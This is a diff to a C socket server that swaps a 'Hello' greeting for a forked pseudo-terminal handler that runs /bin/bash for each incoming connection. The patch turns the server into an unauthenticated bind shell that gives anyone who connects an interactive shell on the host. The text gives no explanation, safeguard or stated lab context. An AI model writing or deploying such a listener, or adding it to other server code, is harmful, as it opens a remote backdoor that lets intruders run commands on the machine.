@@ -6,6 +6,9 @@
 #include <stdio.h>
 #include <string.h>
 #include <signal.h>
+#include <util.h>
+#include <fcntl.h>
+#include <poll.h>
 int pid;
 void handler() {
 	if (pid)
@@ -21,6 +24,7 @@ int main() {
 		int status, sd, new_sd;
 		struct addrinfo hints, *res;
 		struct sockaddr_storage sock_stor;
+        setsid();
 
 		memset(&hints, 0, sizeof(hints));
 		hints.ai_family = AF_UNSPEC;    
@@ -64,13 +68,46 @@ int main() {
 		    if (fork()) {
 		        close(new_sd);
 		    } else {
-		        dup2(new_sd, 0);
-		        dup2(new_sd, 1);
-		        dup2(new_sd, 2);
-		        close(new_sd);
-		        printf("Hello\n");
+                close(sd);
+                int master, slave;
+                char buffer[4096];
+                if (openpty(&master, &slave, buffer, NULL, NULL) != 0) {
+                    close(new_sd);
+                    return 7;
+                }
+                if (fork()) {
+                	close(slave);
+	                char buf1[4096];
+	                fcntl(master, F_SETFL, fcntl(master, F_GETFL) | O_NONBLOCK);
+	                fcntl(new_sd, F_SETFL, fcntl(new_sd, F_GETFL) | O_NONBLOCK); 
+	                while(1) {
+	                    int sz = read(master, buf1, 4096);
+	                    if(sz > 0) {
+	                        write(new_sd, buf1, sz); 
+	                    }
+	                    sz = read(new_sd, buf1, 4096);
+	                    if(sz > 0) {
+	                        write(master, buf1, sz); 
+	                    }
+	                    sleep(1);
+	                }
+                } else {
+                    close(master);
+	                dup2(slave, 0);
+	                dup2(slave, 1);
+	                dup2(slave, 2);
+	                setsid();
+	                close(new_sd);
+	                int ff = open(buffer, O_RDWR);
+	                if(ff)
+	                    close(ff);
+	                execl("/bin/bash", "/bin/bash", NULL);
+	                return 0;
+                }
 		        return 0;
 		    }
+            close(new_sd);
+            return 0;
 		}
 	    
 	    close(sd);
